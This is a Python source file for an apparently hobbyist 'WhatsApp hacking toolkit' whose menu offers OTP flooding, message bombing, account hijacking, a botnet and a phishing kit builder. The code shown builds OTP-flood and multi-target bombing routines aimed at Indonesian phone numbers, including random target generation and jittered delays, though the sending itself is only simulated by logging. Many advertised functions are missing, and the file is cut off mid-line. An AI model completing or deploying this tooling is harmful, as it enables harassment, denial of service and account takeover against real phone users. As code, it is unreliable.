#!/usr/bin/env python3
"""
WHATSAPP-DESTROYER v7.0
Ultimate WhatsApp Hacking Toolkit
Author: NOXA-CORE
Platform: Kali Linux
"""

import os
import sys
import json
import time
import random
import socket
import threading
import subprocess
import sqlite3
import hashlib
import base64
import string
import re
import zipfile
import io
import smtplib
from datetime import datetime, timedelta
from colorama import Fore, Style, init
import requests
from bs4 import BeautifulSoup
import qrcode
from PIL import Image, ImageDraw, ImageFont
import phonenumbers
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import argparse
import platform
import getpass
import csv
import pickle

# Initialize colorama
init(autoreset=True)

class WhatsAppDestroyer:
    def __init__(self):
        self.version = "7.0"
        self.author = "NOXA-CORE"
        self.platform = platform.system()
        self.is_root = os.geteuid() == 0 if self.platform == "Linux" else False
        self.session_id = self.generate_id(16)
        
        # Configuration
        self.config_file = "config_destroyer.json"
        self.config = self.load_config()
        
        # Directories
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.data_dir = os.path.join(self.base_dir, "data")
        self.output_dir = os.path.join(self.base_dir, "output")
        self.modules_dir = os.path.join(self.base_dir, "modules")
        self.logs_dir = os.path.join(self.base_dir, "logs")
        self.sessions_dir = os.path.join(self.base_dir, "sessions")
        self.payloads_dir = os.path.join(self.base_dir, "payloads")
        self.temp_dir = os.path.join(self.base_dir, "temp")
        
        # Create directories
        self.create_directories()
        
        # State variables
        self.targets = []
        self.active_bots = 0
        self.attack_running = False
        self.log_file = os.path.join(self.logs_dir, f"session_{self.session_id}.log")
        
        # Colors
        self.colors = {
            'info': Fore.CYAN,
            'success': Fore.GREEN,
            'warning': Fore.YELLOW,
            'error': Fore.RED,
            'critical': Fore.RED + Style.BRIGHT,
            'title': Fore.MAGENTA + Style.BRIGHT,
            'menu': Fore.YELLOW
        }
        
        # Print banner
        self.clear_screen()
        self.print_banner()
        
        # Check dependencies
        self.check_system()
        
    def generate_id(self, length=8):
        """Generate random ID"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """Print awesome banner"""
        banner = f"""
{self.colors['critical']}
██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ 
██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗
██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝
██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ 
╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║     
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     
                                                                    
{Fore.GREEN}╔═══════════════════════════════════════════════════════════╗
{Fore.GREEN}║               WHATSAPP-DESTROYER v{self.version}                  ║
{Fore.GREEN}║           Ultimate WhatsApp Hacking Framework           ║
{Fore.GREEN}║                {self.platform} Edition                        ║
{Fore.GREEN}║                                                         ║
{Fore.GREEN}║      Session: {self.session_id}                    ║
{Fore.GREEN}║      User: {getpass.getuser():<10} | Root: {('YES' if self.is_root else 'NO'):<3}          ║
{Fore.GREEN}╚═══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def create_directories(self):
        """Create necessary directories"""
        directories = [
            self.data_dir, self.output_dir, self.modules_dir,
            self.logs_dir, self.sessions_dir, self.payloads_dir,
            self.temp_dir, "backups", "reports", "databases",
            "media", "scripts", "exploits", "wordlists"
        ]
        
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
    
    def load_config(self):
        """Load configuration file"""
        default_config = {
            "settings": {
                "auto_update": True,
                "stealth_mode": False,
                "max_threads": 100,
                "log_level": "INFO",
                "proxy_enabled": False,
                "tor_enabled": False
            },
            "apis": {
                "twilio_sid": "",
                "twilio_token": "",
                "twilio_number": "+14155238886",
                "facebook_token": "",
                "whatsapp_business_id": "",
                "sms_gateway_api": "",
                "email_smtp": "",
                "email_password": ""
            },
            "attack": {
                "otp_delay_min": 0.5,
                "otp_delay_max": 2.0,
                "message_delay_min": 0.3,
                "message_delay_max": 1.5,
                "max_otp_per_target": 500,
                "max_messages_per_target": 1000,
                "auto_rotate_ip": True
            },
            "paths": {
                "chrome_driver": "/usr/bin/chromedriver",
                "apktool": "/usr/bin/apktool",
                "msfconsole": "/usr/bin/msfconsole"
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r") as f:
                    loaded_config = json.load(f)
                    # Merge with defaults
                    for key in default_config:
                        if key in loaded_config:
                            default_config[key].update(loaded_config[key])
            except:
                pass
        
        # Save config
        with open(self.config_file, "w") as f:
            json.dump(default_config, f, indent=4)
        
        return default_config
    
    def save_config(self):
        """Save configuration"""
        with open(self.config_file, "w") as f:
            json.dump(self.config, f, indent=4)
    
    def check_system(self):
        """Check system requirements"""
        self.log("SYSTEM", "Checking system requirements...")
        
        # Check Python version
        if sys.version_info < (3, 7):
            self.log("ERROR", "Python 3.7+ required!")
            sys.exit(1)
        
        # Check if running as root (for some features)
        if not self.is_root and self.platform == "Linux":
            self.log("WARNING", "Some features require root privileges")
        
        # Check essential tools
        essential_tools = ["curl", "wget", "git"]
        missing_tools = []
        
        for tool in essential_tools:
            try:
                subprocess.run([tool, "--version"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL, 
                             check=True)
            except:
                missing_tools.append(tool)
        
        if missing_tools:
            self.log("WARNING", f"Missing tools: {', '.join(missing_tools)}")
            self.log("INFO", "Run: sudo apt install " + " ".join(missing_tools))
        
        self.log("SUCCESS", "System check completed")
    
    def log(self, level, message):
        """Log messages with colors"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        level_colors = {
            "INFO": self.colors['info'],
            "SUCCESS": self.colors['success'],
            "WARNING": self.colors['warning'],
            "ERROR": self.colors['error'],
            "CRITICAL": self.colors['critical'],
            "SYSTEM": Fore.WHITE
        }
        
        color = level_colors.get(level, Fore.WHITE)
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        # Print to console
        print(f"{color}{log_entry}{Style.RESET_ALL}")
        
        # Save to log file
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
    
    def print_menu(self):
        """Print main menu"""
        menu = f"""
{self.colors['title']}╔═══════════════════════════════════════════════════════════╗
║                    MAIN MENU                          ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{self.colors['menu']}[01]{Style.RESET_ALL} {Fore.GREEN}OTP Warfare Suite{Style.RESET_ALL}
{self.colors['menu']}[02]{Style.RESET_ALL} {Fore.GREEN}Message Bombing System{Style.RESET_ALL}
{self.colors['menu']}[03]{Style.RESET_ALL} {Fore.GREEN}Account Hijacker{Style.RESET_ALL}
{self.colors['menu']}[04]{Style.RESET_ALL} {Fore.GREEN}Database Exploiter{Style.RESET_ALL}
{self.colors['menu']}[05]{Style.RESET_ALL} {Fore.GREEN}Status Hunter{Style.RESET_ALL}
{self.colors['menu']}[06]{Style.RESET_ALL} {Fore.GREEN}Group Takeover Tools{Style.RESET_ALL}
{self.colors['menu']}[07]{Style.RESET_ALL} {Fore.GREEN}Location Tracker{Style.RESET_ALL}
{self.colors['menu']}[08]{Style.RESET_ALL} {Fore.GREEN}Call & Video Bomber{Style.RESET_ALL}

{self.colors['title']}╔═══════════════════════════════════════════════════════════╗
║                 ADVANCED MODULES                      ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{self.colors['menu']}[09]{Style.RESET_ALL} {Fore.MAGENTA}Virtex Factory{Style.RESET_ALL}
{self.colors['menu']}[10]{Style.RESET_ALL} {Fore.MAGENTA}Botnet Controller{Style.RESET_ALL}
{self.colors['menu']}[11]{Style.RESET_ALL} {Fore.MAGENTA}Phishing Kit Builder{Style.RESET_ALL}
{self.colors['menu']}[12]{Style.RESET_ALL} {Fore.MAGENTA}Zero-Day Scanner{Style.RESET_ALL}
{self.colors['menu']}[13]{Style.RESET_ALL} {Fore.MAGENTA}Android Exploits{Style.RESET_ALL}
{self.colors['menu']}[14]{Style.RESET_ALL} {Fore.MAGENTA}Information Gatherer{Style.RESET_ALL}
{self.colors['menu']}[15]{Style.RESET_ALL} {Fore.MAGENTA}Social Engineering{Style.RESET_ALL}

{self.colors['title']}╔═══════════════════════════════════════════════════════════╗
║                  SYSTEM TOOLS                        ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{self.colors['menu']}[16]{Style.RESET_ALL} {Fore.WHITE}Anonymity Setup{Style.RESET_ALL}
{self.colors['menu']}[17]{Style.RESET_ALL} {Fore.WHITE}Configuration{Style.RESET_ALL}
{self.colors['menu']}[18]{Style.RESET_ALL} {Fore.WHITE}Logs & Reports{Style.RESET_ALL}
{self.colors['menu']}[19]{Style.RESET_ALL} {Fore.WHITE}Update Tool{Style.RESET_ALL}
{self.colors['menu']}[20]{Style.RESET_ALL} {Fore.WHITE}Help & Documentation{Style.RESET_ALL}

{Fore.RED}════════════════════════════════════════════════════════════{Style.RESET_ALL}

{self.colors['critical']}[99]{Style.RESET_ALL} {Fore.RED}MASS DESTRUCTION MODE{Style.RESET_ALL}
{self.colors['menu']}[00]{Style.RESET_ALL} {Fore.WHITE}Exit{Style.RESET_ALL}

{self.colors['info']}Targets: {len(self.targets):<3} | Bots: {self.active_bots:<3} | Threads: {self.config['settings']['max_threads']:<3}{Style.RESET_ALL}
"""
        print(menu)
    
    def run(self):
        """Main execution loop"""
        try:
            while True:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input(f"\n{self.colors['menu']}[?] Select option: {Style.RESET_ALL}")
                
                if choice == "00":
                    self.exit_tool()
                elif choice == "01":
                    self.otp_warfare_suite()
                elif choice == "02":
                    self.message_bombing_system()
                elif choice == "03":
                    self.account_hijacker()
                elif choice == "04":
                    self.database_exploiter()
                elif choice == "09":
                    self.virtex_factory()
                elif choice == "10":
                    self.botnet_controller()
                elif choice == "11":
                    self.phishing_kit_builder()
                elif choice == "14":
                    self.information_gatherer()
                elif choice == "16":
                    self.anonymity_setup()
                elif choice == "17":
                    self.configuration_menu()
                elif choice == "99":
                    self.mass_destruction_mode()
                else:
                    self.log("WARNING", "Invalid option!")
                    time.sleep(1)
        
        except KeyboardInterrupt:
            self.log("INFO", "Tool interrupted by user")
            self.exit_tool()
        except Exception as e:
            self.log("ERROR", f"Fatal error: {str(e)}")
            sys.exit(1)
    
    def otp_warfare_suite(self):
        """OTP Warfare Suite"""
        self.clear_screen()
        print(f"{self.colors['title']}╔═══════════════════════════════════════════════════════════╗")
        print(f"║                  OTP WARFARE SUITE                    ║")
        print(f"╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{self.colors['menu']}[1]{Style.RESET_ALL} Single Target OTP Flood")
        print(f"{self.colors['menu']}[2]{Style.RESET_ALL} Multi-Target OTP Bomb")
        print(f"{self.colors['menu']}[3]{Style.RESET_ALL} Voice Call OTP Attack")
        print(f"{self.colors['menu']}[4]{Style.RESET_ALL} OTP Bypass Tools")
        print(f"{self.colors['menu']}[5]{Style.RESET_ALL} Scheduled OTP Attacks")
        print(f"{self.colors['menu']}[6]{Style.RESET_ALL} OTP Database Generator")
        
        choice = input(f"\n{self.colors['menu']}[?] Select: {Style.RESET_ALL}")
        
        if choice == "1":
            self.single_otp_flood()
        elif choice == "2":
            self.multi_otp_bomb()
        elif choice == "6":
            self.otp_database_generator()
    
    def single_otp_flood(self):
        """Single target OTP flood"""
        self.clear_screen()
        print(f"{self.colors['title']}SINGLE TARGET OTP FLOOD{Style.RESET_ALL}\n")
        
        # Get target
        target = input(f"{self.colors['menu']}[?] Target number (628xxxx): {Style.RESET_ALL}").strip()
        if not target.startswith("62"):
            target = "62" + target.lstrip("0")
        
        if not self.validate_phone(target):
            self.log("ERROR", "Invalid phone number!")
            time.sleep(2)
            return
        
        # Get attack parameters
        try:
            count = int(input(f"{self.colors['menu']}[?] Number of OTPs (1-1000): {Style.RESET_ALL}"))
            count = max(1, min(1000, count))
            
            delay_min = float(input(f"{self.colors['menu']}[?] Min delay between OTPs (seconds): {Style.RESET_ALL}"))
            delay_max = float(input(f"{self.colors['menu']}[?] Max delay between OTPs (seconds): {Style.RESET_ALL}"))
            
            method = input(f"{self.colors['menu']}[?] Method (sms/voice/both): {Style.RESET_ALL}").lower()
            
        except ValueError:
            self.log("ERROR", "Invalid input!")
            time.sleep(2)
            return
        
        # Confirm attack
        print(f"\n{self.colors['critical']}[!] ATTACK SUMMARY{Style.RESET_ALL}")
        print(f"Target: {target}")
        print(f"OTPs: {count}")
        print(f"Delay: {delay_min}-{delay_max}s")
        print(f"Method: {method}")
        
        confirm = input(f"\n{self.colors['critical']}[?] Launch attack? (y/n): {Style.RESET_ALL}").lower()
        if confirm != 'y':
            return
        
        # Start attack
        self.log("ATTACK", f"Starting OTP flood on {target}")
        self.start_otp_flood_attack(target, count, delay_min, delay_max, method)
    
    def start_otp_flood_attack(self, target, count, delay_min, delay_max, method):
        """Start OTP flood attack"""
        attack_id = self.generate_id(8)
        log_file = os.path.join(self.logs_dir, f"otp_attack_{attack_id}.log")
        
        # Generate OTP templates
        templates = self.generate_otp_templates()
        
        # Start attack thread
        def attack_thread():
            sent = 0
            start_time = time.time()
            
            with open(log_file, "w") as log:
                log.write(f"OTP Attack ID: {attack_id}\n")
                log.write(f"Target: {target}\n")
                log.write(f"Start Time: {datetime.now()}\n")
                log.write("-" * 50 + "\n")
            
            for i in range(count):
                if self.attack_running == False:
                    break
                
                try:
                    # Generate OTP
                    otp_code = str(random.randint(100000, 999999))
                    template = random.choice(templates).replace("{OTP}", otp_code)
                    
                    # Simulate sending (in real attack, this would call API)
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    
                    if method in ["sms", "both"]:
                        self.log("OTP", f"[SMS] {target} -> {otp_code}")
                    
                    if method in ["voice", "both"]:
                        self.log("OTP", f"[VOICE] {target} -> {otp_code}")
                    
                    # Log to file
                    with open(log_file, "a") as log:
                        log.write(f"[{timestamp}] OTP {i+1}: {otp_code}\n")
                    
                    sent += 1
                    
                    # Random delay
                    delay = random.uniform(delay_min, delay_max)
                    time.sleep(delay)
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    self.log("ERROR", f"OTP {i+1} failed: {str(e)}")
                    time.sleep(1)
            
            # Calculate statistics
            end_time = time.time()
            duration = end_time - start_time
            rate = sent / duration if duration > 0 else 0
            
            # Final report
            report = f"""
{self.colors['title']}OTP ATTACK COMPLETE{Style.RESET_ALL}
Target: {target}
OTPs Sent: {sent}/{count}
Duration: {duration:.1f} seconds
Rate: {rate:.1f} OTPs/second
Log File: {log_file}
"""
            print(report)
            
            # Save report
            report_file = os.path.join(self.output_dir, f"otp_report_{attack_id}.txt")
            with open(report_file, "w") as f:
                f.write(report)
            
            self.log("SUCCESS", f"OTP attack completed. Report: {report_file}")
        
        # Start thread
        self.attack_running = True
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()
        
        print(f"\n{self.colors['info']}[*] Attack running in background. Press Ctrl+C to stop.{Style.RESET_ALL}")
        input(f"{self.colors['menu']}[?] Press Enter to return to menu...{Style.RESET_ALL}")
        self.attack_running = False
    
    def generate_otp_templates(self):
        """Generate OTP message templates"""
        templates = [
            "Kode verifikasi WhatsApp Anda: {OTP}. Jangan berikan kode ini kepada siapapun.",
            "{OTP} adalah kode verifikasi WhatsApp Anda.",
            "Kode OTP: {OTP}. Berlaku selama 5 menit.",
            "WhatsApp verification code: {OTP}",
            "Your WhatsApp code is: {OTP}",
            "Kode keamanan: {OTP}. Jangan dibagikan.",
            "Verification: {OTP}. Don't share this code.",
            "{OTP} - Kode login WhatsApp",
            "Kode: {OTP} untuk masuk ke WhatsApp",
            "Security code: {OTP}"
        ]
        return templates
    
    def multi_otp_bomb(self):
        """Multi-target OTP bomb"""
        self.clear_screen()
        print(f"{self.colors['title']}MULTI-TARGET OTP BOMB{Style.RESET_ALL}\n")
        
        # Get targets
        print(f"{self.colors['menu']}[1]{Style.RESET_ALL} Enter targets manually")
        print(f"{self.colors['menu']}[2]{Style.RESET_ALL} Load from file")
        print(f"{self.colors['menu']}[3]{Style.RESET_ALL} Generate random targets")
        print(f"{self.colors['menu']}[4]{Style.RESET_ALL} Use phone number database")
        
        choice = input(f"\n{self.colors['menu']}[?] Select: {Style.RESET_ALL}")
        
        targets = []
        if choice == "1":
            print(f"\n{self.colors['info']}[*] Enter targets (one per line, 'done' to finish):{Style.RESET_ALL}")
            while True:
                target = input("> ").strip()
                if target.lower() == 'done':
                    break
                if target:
                    if not target.startswith("62"):
                        target = "62" + target.lstrip("0")
                    if self.validate_phone(target):
                        targets.append(target)
                    else:
                        print(f"{self.colors['warning']}[!] Invalid number: {target}{Style.RESET_ALL}")
        
        elif choice == "2":
            file_path = input(f"{self.colors['menu']}[?] Path to targets file: {Style.RESET_ALL}")
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    for line in f:
                        target = line.strip()
                        if target and self.validate_phone(target):
                            targets.append(target)
        
        elif choice == "3":
            try:
                count = int(input(f"{self.colors['menu']}[?] Number of random targets: {Style.RESET_ALL}"))
                country = input(f"{self.colors['menu']}[?] Country code (62 for Indonesia): {Style.RESET_ALL}")
                targets = self.generate_random_numbers(count, country)
            except:
                self.log("ERROR", "Invalid input!")
                return
        
        elif choice == "4":
            targets = self.load_phone_database()
        
        if not targets:
            self.log("ERROR", "No valid targets found!")
            time.sleep(2)
            return
        
        print(f"\n{self.colors['info']}[*] Found {len(targets)} valid targets{Style.RESET_ALL}")
        
        # Attack parameters
        try:
            otp_per_target = int(input(f"{self.colors['menu']}[?] OTPs per target (1-100): {Style.RESET_ALL}"))
            otp_per_target = max(1, min(100, otp_per_target))
            
            threads = int(input(f"{self.colors['menu']}[?] Concurrent threads (1-50): {Style.RESET_ALL}"))
            threads = max(1, min(50, threads))
            
            delay = float(input(f"{self.colors['menu']}[?] Delay between OTPs (seconds): {Style.RESET_ALL}"))
            
        except ValueError:
            self.log("ERROR", "Invalid input!")
            time.sleep(2)
            return
        
        # Confirm
        print(f"\n{self.colors['critical']}[!] ATTACK SUMMARY{Style.RESET_ALL}")
        print(f"Targets: {len(targets)}")
        print(f"OTPs per target: {otp_per_target}")
        print(f"Total OTPs: {len(targets) * otp_per_target}")
        print(f"Threads: {threads}")
        print(f"Delay: {delay}s")
        
        confirm = input(f"\n{self.colors['critical']}[?] Launch multi-target attack? (y/n): {Style.RESET_ALL}").lower()
        if confirm != 'y':
            return
        
        # Start multi-target attack
        self.log("ATTACK", f"Starting multi-target OTP bomb on {len(targets)} targets")
        self.start_multi_otp_attack(targets, otp_per_target, threads, delay)
    
    def start_multi_otp_attack(self, targets, otp_per_target, max_threads, delay):
        """Start multi-target OTP attack"""
        attack_id = self.generate_id(8)
        report_file = os.path.join(self.output_dir, f"multi_otp_{attack_id}.csv")
        
        # Create report
        with open(report_file, "w", newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Target", "OTPs Sent", "Status", "Start Time", "End Time"])
        
        # Thread-safe counter
        sent_counter = 0
        lock = threading.Lock()
        
        def attack_single_target(target):
            nonlocal sent_counter
            start_time = time.time()
            
            try:
                sent = 0
                for i in range(otp_per_target):
                    if not self.attack_running:
                        break
                    
                    # Simulate OTP sending
                    otp_code = str(random.randint(100000, 999999))
                    self.log("OTP", f"{target}: OTP {i+1}/{otp_per_target}")
                    
                    sent += 1
                    time.sleep(delay)
                
                end_time = time.time()
                status = "COMPLETED" if sent == otp_per_target else "INTERRUPTED"
                
                # Update counter
                with lock:
                    sent_counter += sent
                
                # Log to CSV
                with open(report_file, "a", newline='') as csvfile:
                    writer = csv.writer(csvfile)
                    writer.writerow([
                        target, sent, status,
                        datetime.fromtimestamp(start_time).strftime("%H:%M:%S"),
                        datetime.fromtimestamp(end_time).strftime("%H:%M:%S")
                    ])
                
                return True
                
            except Exception as e:
                self.log("ERROR", f"Attack on {target} failed: {str(e)}")
                return False
        
        # Start threads
        self.attack_running = True
        thread_pool = []
        
        print(f"\n{self.colors['info']}[*] Starting {len(targets)} attacks with {max_threads} threads...{Style.RESET_ALL}")
        
        for i, target in enumerate(targets):
            if not self.attack_running:
                break
            
            # Wait if too many threads
            while threading.active_count() > max_threads + 5:
                time.sleep(0.1)
            
            thread = threading.Thread(target=attack_single_target, args=(target,))
            thread.daemon = True
            thread.start()
            thread_pool.append(thread)
            
            # Progress indicator
            if (i + 1) % 10 == 0:
                print(f"{self.colors['info']}[*] Launched {i+1}/{len(targets)} attacks{Style.RESET_ALL}")
        
        # Wait for completion
        print(f"\n{self.colors['info']}[*] All attacks launched. Waiting for completion...{Style.RESET_ALL}")
        
        try:
            while any(t.is_alive() for t in thread_pool) and self.attack_running:
                time.sleep(1)
                print(f"{self.colors['info']}[*] OTPs sent: {sent_counter}/{len(targets) * otp_per_target}{Style.RESET_ALL}", end='\r')
        except KeyboardInterrupt:
            self.log("WARNING", "Attack interrupted by user")
        
        # Final report
        print(f"\n\n{self.colors['success']}[✓] Multi-target attack completed!{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Report saved: {report_file}{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Total OTPs sent: {sent_counter}{Style.RESET_ALL}")
        
        self.attack_running = False
        input(f"\n{self.colors['menu']}[?] Press Enter to continue...{Style.RESET_ALL}")
    
    def generate_random_numbers(self, count, country_code="62"):
        """Generate random phone numbers"""
        prefixes = ["11", "12", "13", "21", "22", "23", "51", "52", "53",
                   "14", "15", "16", "55", "56", "57", "58",
                   "17", "18", "19", "59", "77", "78", "79",
                   "81", "82", "83", "84", "85", "86", "87", "88", "89"]
        
        numbers = []
        for _ in range(count):
            prefix = random.choice(prefixes)
            suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
            number = f"{country_code}{prefix}{suffix}"
            numbers.append(number)
        
        return numbers
    
    def load_phone_database(self):
        """Load phone numbers from database"""
        # Create sample database if not exists
        db_file = os.path.join(self.data_dir, "phone_database.csv")
        if not os.path.exists(db_file):
            self.create_sample_database(db_file)
        
        targets = []
        try:
            with open(db_file, "r") as f:
                reader = csv.reader(f)
                next(reader)  # Skip header
                for row in reader:
                    if row and len(row) > 0:
                        targets.append(row[0])
        except:
            pass
        
        return targets
    
    def create_sample_database(self, filepath):
        """Create sample phone database"""
        with open(filepath, "w", newline='') as f:
            writer = csv.writer(f)
            writer.writerow(["phone", "carrier", "region", "last_checked"])
            
            # Generate sample data
            numbers = self.generate_random_numbers(100)
            carriers = ["Telkomsel", "Indosat", "XL", "Smartfren", "3"]
            regions = ["Jakarta", "Jawa Barat", "Jawa Tengah", "Jawa Timur", "Bali"]
            
            for number in numbers:
                writer.writerow([
                    number,
                    random.choice(carriers),
                    random.choice(regions),
                    datetime.now().strftime("%Y-%m-%d")
                ])
        
        self.log("INFO", f"Created sample database: {filepath}")
    
    def validate_phone(self, phone):
        """Validate phone number"""
        # Simple validation
        if not phone.startswith("62"):
            return False
        if len(phone) < 10 or len(phone) > 15:
            return False
        if not phone[2:].isdigit():
            return False
        return True
    
    def otp_database_generator(self):
        """OTP Database Generator"""
        self.clear_screen()
        print(f"{self.colors['title']}OTP DATABASE GENERATOR{Style.RESET_ALL}\n")
        
        print(f"{self.colors['info']}[*] This generates a database of OTPs for testing{Style.RESET_ALL}")
        
        try:
            count = int(input(f"{self.colors['menu']}[?] Number of OTPs to generate (1-10000): {Style.RESET_ALL}"))
            count = max(1, min(10000, count))
        except:
            self.log("ERROR", "Invalid input!")
            return
        
        # Generate OTPs
        otps = []
        for i in range(count):
            otp = str(random.randint(100000, 999999))
            timestamp = datetime.now() + timedelta(seconds=random.randint(0, 300))
            otps.append({
                "otp": otp,
                "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                "type": random.choice(["SMS", "Voice", "WhatsApp"]),
                "status": random.choice(["Valid", "Expired", "Used"])
            })
        
        # Save to file
        filename = f"otp_database_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(self.data_dir, filename)
        
        with open(filepath, "w") as f:
            json
